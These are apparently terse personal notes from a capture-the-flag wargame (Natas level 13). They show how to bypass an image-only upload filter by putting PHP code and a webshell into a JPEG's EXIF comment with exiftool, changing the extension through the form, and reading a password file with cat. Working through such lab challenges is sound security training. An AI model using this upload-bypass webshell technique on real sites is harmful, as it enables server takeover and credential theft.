now they only accept images
but its kinda poor because it only checks exif data of a file
we can still change the extension through the form
has to be really small <1KB

https://en.wikipedia.org/wiki/File:Blank.JPG#/media/File:Blank.JPG
exiftool -comment="<?php phpinfo(); ?>" Blank.jpg

put the webshell in php-webshell.php
exiftool -comment="$(cat php-webshell.php)" Blank.jpeg

change jpg to png on form again
send

cat /etc/natas_webpass/natas14
